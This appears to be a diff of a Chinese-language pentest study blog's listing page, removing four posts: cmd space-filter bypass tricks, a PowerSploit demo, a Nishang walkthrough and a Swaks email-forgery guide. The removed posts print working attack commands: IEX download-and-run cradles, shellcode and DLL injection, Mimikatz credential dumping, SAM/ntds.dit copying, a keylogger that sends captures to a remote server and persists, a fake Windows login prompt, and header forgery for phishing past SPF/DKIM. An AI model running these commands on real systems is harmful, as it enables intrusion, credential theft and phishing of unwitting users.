-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/cmd绕过空格过滤/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/26/cmd绕过空格过滤/" itemprop="url">cmd绕过空格过滤</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/杂项/" itemprop="url" rel="index">
-                    <span itemprop="name">杂项</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="cmd绕过空格过滤"><a href="#cmd绕过空格过滤" class="headerlink" title="cmd绕过空格过滤"></a>cmd绕过空格过滤</h1><p>Ps：<strong>从大佬那里学的一点小技巧</strong></p>
-<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>Windows支持环境变量切片操作，可以切割出一个空格接上。</p>
-<blockquote>
-<p>set //查看环境变量</p>
-</blockquote>
-<blockquote>
-<p>net%CommonProgramFiles:~10,-18%user </p>
-<p> 意思是把CommonProgramFiles变量的正数10位和倒数18位全部切除，然后就剩下一个空格。形变为net user<br>既</p>
-</blockquote>
-<pre><code>CommonProgramFiles=C:\Program Files\Common Files
-net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br>** 经测试在win7,win10,win8,win2008,win2003,均有效</p>
-<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;ping,-c,<span class="number">1</span>,<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#125;</span><br><span class="line">ping$&#123;IFS&#125;-c$&#123;IFS&#125;<span class="number">1</span>$&#123;IFS&#125;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/PowerSploit基本功能演示/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/26/PowerSploit基本功能演示/" itemprop="url">PowerSploit基本功能演示</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="PowerSploit基本功能演示"><a href="#PowerSploit基本功能演示" class="headerlink" title="PowerSploit基本功能演示"></a>PowerSploit基本功能演示</h1><h2 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h2><ul>
-<li><p>AntivirusBypass     //发现杀软查杀特征</p>
-</li>
-<li><p>CodeExecution      //代码执行</p>
-</li>
-<li><p>Exfiltration     //信息收集</p>
-</li>
-<li><p>Mayhem    //破坏性脚本</p>
-</li>
-<li><p>Persistence    //后门</p>
-</li>
-<li><p>Recon     //利用跳板进行内网信息侦擦</p>
-</li>
-<li><p>ScriptModification     //创建或修改脚本</p>
-<h2 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h2><h3 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h3></li>
-<li><ul>
-<li>Invoke-Shellcode.ps1 **</li>
-</ul>
-<p>shellcode注入</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-Shellcode.ps1&quot;)
-//下载并导入脚本
-IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/test&quot;)
-//下载powershell的shellcode
-Invoke-Shellcode -Shellcode ($buf) -Force
-//注入下载的shellcode并运行，-force是为了强制执行，用于消除提示。$用于指定变量，buf为test中的数组，数组中包含shellcode。
-Start-Process c:\windows\system32\notepad.exe -Windowstyle Hidden
-//隐藏的开始一个记事本进程。
-Invoke-Shellcode  -ProcessID 10836  -Shellcode ($buf) -Force
-//将shellcode注入到刚刚开始的记事本进程中。</code></pre></li>
-<li><ul>
-<li>Invoke-DllInjection.ps1 **</li>
-</ul>
-<p>dll注入</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-DllInjection.ps1&quot;)
-//下载并导入脚本
-Invoke-DllInjection  -ProcessID 10836  -Dll c:\test.dll
-//注入dll到指定进程</code></pre><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3></li>
-<li><ul>
-<li>Invoke-Portscan **</li>
-</ul>
-<p>端口扫描</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Recon/Invoke-Portscan.ps1&quot;)
-//下载并导入脚本
-Invoke-Portscan -Hosts 172.22.35.0,172.22.35.255 -Ports &quot;80,445,3389&quot;
-//扫描指定地址及指定端口</code></pre><h3 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h3></li>
-<li><ul>
-<li>Invoke-Mimikatz.ps1 **</li>
-</ul>
-<p>密码抓取，实际上就是Mimikatz的PowerShell版本</p>
-<pre><code> IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Invoke-Mimikatz.ps1&quot;)
- //下载并导入脚本
- Invoke-Mimikatz -DumpCreds
- //抓取密码
-
-** Get-Keystrokes.ps1 **</code></pre><p>键盘记录及鼠标点击记录</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Get-Keystrokes.ps1&quot;)
-//下载并导入脚本
-Get-Keystrokes -LogPath c:\test.txt
-//开启记录并保存到指定位置</code></pre></li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/03/PowerSploit%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/Nishang模块简介及演示/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/26/Nishang模块简介及演示/" itemprop="url">Nishang模块简介及演示</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
-<blockquote>
-<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
-</blockquote>
-<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-<ul>
-<li>Antak-Webshell //webshell</li>
-<li>Backdoor //后门</li>
-<li>Client //客户端</li>
-<li>Escalation //提权</li>
-<li>Execution //RCE</li>
-<li>Gather //信息收集</li>
-<li>Misc //杂项</li>
-<li>Pivot //跳板及远程执行exe</li>
-<li>Scan //扫描</li>
-<li>powerpreter //文件下载及持续性</li>
-</ul>
-<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
-<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
-<blockquote>
-<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
-</blockquote>
-<p>** Copy-VSS.ps1 **</p>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-<blockquote>
-<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
-</blockquote>
-<pre><code>Copy-VSS //直接把文件保存到当前路径
-Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>​<br>** FireBuster.ps1 and FireListener.ps1 **</p>
-<blockquote>
-<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
-</blockquote>
-<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
-FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
-<blockquote>
-<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
-</blockquote>
-<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
-.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
-erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
-.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
-Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
-<blockquote>
-<p>获取用户密码的提示信息，如果有的话。</p>
-</blockquote>
-<pre><code>Get-PassHints</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/使用Swaks对邮件进行深入定制/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/26/使用Swaks对邮件进行深入定制/" itemprop="url">Swaks简介</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/社会工程学/" itemprop="url" rel="index">
-                    <span itemprop="name">社会工程学</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Swaks简介"><a href="#Swaks简介" class="headerlink" title="Swaks简介"></a>Swaks简介</h1><blockquote>
-<p><strong>Swaks</strong>的主要设计目标是成为一个灵活的，可编写脚本的，面向对象的SMTP测试工具。它处理SMTP功能和扩展，如TLS，身份验证和流水线操作; 多种版本的SMTP协议，包括SMTP， ESMTP和LMTP ; 和多种传输方法，包括unix-domain套接字，internet-domain套接字和生成进程的管道。可以在环境变量，配置文件和命令行中指定选项，从而为操作员和脚本编写者提供最大的可配置性和易用性。</p>
-</blockquote>
-<p>Swaks也被称为SMTP协议的瑞士军刀，它可以灵活的操作SMTP协议报文，它通常被用来伪造邮件，进行钓鱼、社工等操作。并且可以绕过常规的基于SPF与DKIM的垃圾邮箱检测。Kali已预装Swaks</p>
-<h2 id="基本参数说明"><a href="#基本参数说明" class="headerlink" title="基本参数说明"></a>基本参数说明</h2><blockquote>
-<p>swaks –to <a href="mailto:test@qq.com" target="_blank" rel="noopener">test@qq.com</a>     //首先测试邮箱的连通性；</p>
-<blockquote>
-<ul>
-<li>–to  <a href="mailto:test@gmail.com" target="_blank" rel="noopener">test@gmail.com</a>      //接件人邮箱；</li>
-<li>–from  <a href="mailto:test@qq.com" target="_blank" rel="noopener">test@qq.com</a>     //发件人邮箱；</li>
-<li>–ehlo  qq.com     //伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证；</li>
-<li>–server  mail.smtp2go.com     //服务邮件域</li>
-<li>–body  “test”    //引号中的内容即为邮件正文，可直接引用文件；</li>
-<li>–data  ./Desktop/email.txt    //将正常源邮件的内容保存成TXT文件，再作为正常邮件发送；</li>
-<li>–header  “Subject:标题”     //邮件标题;</li>
-<li>–header-X-Mailer  gmail.com     //X-Mailer标头表示用于起草和发送原始电子邮件的程序</li>
-<li>–h-From:  ‘boss <a href="mailto:admin@gmail.com" target="_blank" rel="noopener">admin@gmail.com</a>‘     //伪造的发件人邮箱；</li>
-<li>–attach /root/test.txt     //附件</li>
-</ul>
-</blockquote>
-</blockquote>
-<h2 id="SPF验证原理"><a href="#SPF验证原理" class="headerlink" title="SPF验证原理"></a>SPF验证原理</h2><blockquote>
-<p>SPF是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。<br>按照SPF的格式在DNS记录中增加一条TXT类型的记录，将提高该域名的信誉度，同时可以防止垃圾邮件伪造该域的发件人发送垃圾邮件。<br>SPF是跟DNS相关的一项技术，它的内容写在DNS的txt类型的记录里面。mx记录的作用是给寄信者指明某个域名的邮件服务器有哪些。SPF的作用跟mx相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。<br>由定义可以看出，SPF的作用主要是反垃圾邮件，主要针对那些发信人伪造域名的垃圾邮件。</p>
-</blockquote>
-<p>如果mail.smtp2go.com是真正的邮件服务器，那么Gmail的服务器收到的源IP也肯定是mail.smtp2go.com的IP。Gmail中会校验邮件发送者的IP是否存在于smtp.from的域名SPF配置列表里,但是邮件显示的是from头中的域而不是服务邮件域，因此可以将服务邮件域设置为正常的邮件服务器地址，伪造一个Mail.From即可。</p>
-<h2 id="DKIM工作原理"><a href="#DKIM工作原理" class="headerlink" title="DKIM工作原理"></a>DKIM工作原理</h2><blockquote>
-<p>DKIM 的基本工作原理同样是基于传统的密钥认证方式，他会产生两组钥匙，公钥(public key)和私钥(private key)，公钥将会存放在 DNS 中，而私钥会存放在寄信服务器中。数字签名会自动产生，并依附在邮件头中，发送到寄信者的服务器里。公钥则放在DNS服务器上，供自动获得。收信的服务器，将会收到夹带在邮件头中的签名和在DNS上自己获取公钥，然后进行比对，比较寄信者的域名是否合法，如果不合法，则判定为垃圾邮件。</p>
-</blockquote>
-<p>但是这里由于使用了第三方邮件服务器,公钥和私钥已经提供了.</p>
-<h3 id="实际效果"><a href="#实际效果" class="headerlink" title="实际效果"></a>实际效果</h3><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/2.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/1.png" alt="avatar"></p>
-<ul>
-<li><strong>总结：SPF和DKIM已经pass了，DMARC这东西不清楚是什么，但是暂时不影响邮件的正常接收。<br>在测试过程中发现，伪造gmail域时不能发给gmail域，只能伪造为其他域的邮件发送，比如163.com,qq.com。整体来说，电脑上查看就比正常邮件多了个通过xxx代发，又因为手机上信息显示不全，手机查看几乎无破绽，所以欺骗性还是非常强的</strong></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1745,7 +1915,7 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
